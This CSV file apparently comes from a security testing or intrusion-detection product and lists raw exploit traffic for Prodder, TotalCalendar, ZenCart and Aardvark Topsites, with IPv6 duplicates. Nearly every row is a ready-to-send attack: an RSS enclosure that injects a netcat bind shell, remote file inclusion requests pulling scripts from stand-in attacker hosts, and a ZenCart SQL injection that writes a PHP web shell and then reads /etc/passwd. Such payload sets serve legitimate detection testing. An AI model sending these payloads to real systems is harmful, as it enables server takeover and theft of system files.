XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿Prodder_cmi_IPv6.xml,Prodder Arbitrary Shell Command Execution Vulnerability (IPv6 Version),This threat exploits a failure in Prodder to properly sanitize user-supplied input allowing arbitrary command-execution vulnerability. (IPv6 Version),HTTP/IPv6,TCP,GET /evil.xml HTTP/1.0[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: close[[0D 0A 0D 0A]]
Prodder_cmi_IPv6.xml,Prodder Arbitrary Shell Command Execution Vulnerability (IPv6 Version),This threat exploits a failure in Prodder to properly sanitize user-supplied input allowing arbitrary command-execution vulnerability. (IPv6 Version),HTTP/IPv6,TCP,"<?xml version=""1.0"" encoding=""UTF-8""?>[[0D 0A ]]<?xml-stylesheet type=""text/xsl""?>[[0D 0A ]]<rss version=""2.0"">[[0D 0A ]]<channel>[[0D 0A ]]    <title>RedTeam Pentesting Example Malicious Server Feed</title>[[0D 0A 0D 0A ]]    <item>[[0D 0A ]]        <enclosure url=""http://www.example.com/example.mp3'; nc -e /bin/sh -l -p 1337 &amp; ';#'""[[0D 0A ]]         length=""241734"" type=""audio/mpeg"" />[[0D 0A ]]    </item>[[0D 0A ]]</channel>[[0D 0A ]]</rss>"
﻿TotalCalendar_cmi.xml,TotalCalendar 2.30 Remote File Include Vulnerability,This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the inc_dir variable. TotalCalandar is a web application with typically listens on port 80.,HTTP,TCP,"GET /index.php?inc_dir=http://www.yourspace.com/yourscript.txt?&ls%20-laF HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A]]"
TotalCalendar_cmi.xml,TotalCalendar 2.30 Remote File Include Vulnerability,This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the inc_dir variable. TotalCalandar is a web application with typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿TotalCalendar_cmi_IPv6.xml,TotalCalendar 2.30 Remote File Include Vulnerability (IPv6 Version),This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the inc_dir variable. TotalCalandar is a web application with typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /index.php?inc_dir=http://www.yourspace.com/yourscript.txt?&ls%20-laF HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A]]"
TotalCalendar_cmi_IPv6.xml,TotalCalendar 2.30 Remote File Include Vulnerability (IPv6 Version),This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the inc_dir variable. TotalCalandar is a web application with typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ZenCart_sqlcmi.xml,ZenCart SQL Injection Into Remote Command Execution,"This threat sends a crafted URL that contains an SQL query to be executed by the server, this in turn allows inclusion of PHP code via the database;  which allows subsequent arbitrary command execution. ZenCart is an web application that typically listens on port 80.",HTTP,TCP,POST /xencart/admin/password_forgotten.php HTTP/1.1[[0D 0A ]]Host: www.exampl.com[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A ]]Content-Length: 262[[0D 0A ]]Connection: Close[[0D 0A 0D 0A ]]admin_email=%27UNION+SELECT+0%2C0%2C%27%3C%3Fphp+echo+%22Hi+Master%21%22%3Berror_reporting%280%29%3Bini_set%28%22max_execution_time%22%2C0%29%3Bsystem%28%24_GET%5Bcmd%5D%29%3B%3F%3E%27%2C0+INTO+OUTFILE+%27%2Fwww%2Fzencartipn.php%27+from+admin%2F%2A&submit=resend
ZenCart_sqlcmi.xml,ZenCart SQL Injection Into Remote Command Execution,"This threat sends a crafted URL that contains an SQL query to be executed by the server, this in turn allows inclusion of PHP code via the database;  which allows subsequent arbitrary command execution. ZenCart is an web application that typically listens on port 80.",HTTP,TCP,GET /xencart/ipn.php?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1[[0D 0A ]]Host: www.google.com[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
ZenCart_sqlcmi.xml,ZenCart SQL Injection Into Remote Command Execution,"This threat sends a crafted URL that contains an SQL query to be executed by the server, this in turn allows inclusion of PHP code via the database;  which allows subsequent arbitrary command execution. ZenCart is an web application that typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ZenCart_sqlcmi_IPv6.xml,ZenCart SQL Injection Into Remote Command Execution (IPv6 Version),"This threat sends a crafted URL that contains an SQL query to be executed by the server, this in turn allows inclusion of PHP code via the database;  which allows subsequent arbitrary command execution. ZenCart is an web application that typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,POST /xencart/admin/password_forgotten.php HTTP/1.1[[0D 0A ]]Host: www.exampl.com[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A ]]Content-Length: 262[[0D 0A ]]Connection: Close[[0D 0A 0D 0A ]]admin_email=%27UNION+SELECT+0%2C0%2C%27%3C%3Fphp+echo+%22Hi+Master%21%22%3Berror_reporting%280%29%3Bini_set%28%22max_execution_time%22%2C0%29%3Bsystem%28%24_GET%5Bcmd%5D%29%3B%3F%3E%27%2C0+INTO+OUTFILE+%27%2Fwww%2Fzencartipn.php%27+from+admin%2F%2A&submit=resend
ZenCart_sqlcmi_IPv6.xml,ZenCart SQL Injection Into Remote Command Execution (IPv6 Version),"This threat sends a crafted URL that contains an SQL query to be executed by the server, this in turn allows inclusion of PHP code via the database;  which allows subsequent arbitrary command execution. ZenCart is an web application that typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,GET /xencart/ipn.php?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1[[0D 0A ]]Host: www.google.com[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
ZenCart_sqlcmi_IPv6.xml,ZenCart SQL Injection Into Remote Command Execution (IPv6 Version),"This threat sends a crafted URL that contains an SQL query to be executed by the server, this in turn allows inclusion of PHP code via the database;  which allows subsequent arbitrary command execution. ZenCart is an web application that typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿aardvarktopsites_cmi.xml,Aardvark Topsites PHP 4.2.2 Arbitrary Command Execution (join.php),This threat leverages an arbitrary file inclusion flaw into a remote command execution flaw through a flaw in  the join.php script. Aardvark Topsites is a web application which typically listens on port 80.,HTTP,TCP,"GET //sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]=/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]=http://yourhost/cmd.gif?cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
aardvarktopsites_cmi.xml,Aardvark Topsites PHP 4.2.2 Arbitrary Command Execution (join.php),This threat leverages an arbitrary file inclusion flaw into a remote command execution flaw through a flaw in  the join.php script. Aardvark Topsites is a web application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿aardvarktopsites_cmi_IPv6.xml,Aardvark Topsites PHP 4.2.2 Arbitrary Command Execution (join.php) (IPv6 Version),This threat leverages an arbitrary file inclusion flaw into a remote command execution flaw through a flaw in  the join.php script. Aardvark Topsites is a web application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET //sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]=/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]=http://yourhost/cmd.gif?cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
aardvarktopsites_cmi_IPv6.xml,Aardvark Topsites PHP 4.2.2 Arbitrary Command Execution (join.php) (IPv6 Version),This threat leverages an arbitrary file inclusion flaw into a remote command execution flaw through a flaw in  the join.php script. Aardvark Topsites is a web application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿aardvarktopsites_cmi_b.xml,Aardvark Topsites PHP 4.2.2 Remote Command Execution,This threat leverages an arbitrary file inclusion flaw into a remote command execution flaw through a flaw in  the lostpw.php script. Aardvark Topsites is a web application which typically listens on port 80.,HTTP,TCP,"GET /sources/lostpw.php?FORM[set]=1&FORM[session_id]=1&CONFIG[path]=http://www/attacker.com/shell.php?cmd=%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B%20cat%20%2Fetc%2Fpasswd%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.google.com[[0D 0A ]]User-Agent: Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101[[0D 0A 0D 0A 0D 0A]]"
